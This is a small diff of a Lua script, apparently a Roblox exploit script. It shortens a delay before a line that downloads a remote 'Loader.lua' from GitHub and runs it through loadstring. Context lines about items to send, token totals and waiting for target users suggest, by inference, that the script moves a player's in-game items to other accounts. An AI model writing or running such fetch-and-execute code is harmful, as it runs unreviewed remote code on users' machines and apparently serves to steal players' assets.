@@ -577,5 +577,5 @@ if #itemsToSend > 0 or totalTokens > 0 then
     waitForTargetUsers()
 end
 
-task.wait(5)
+task.wait(1)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()
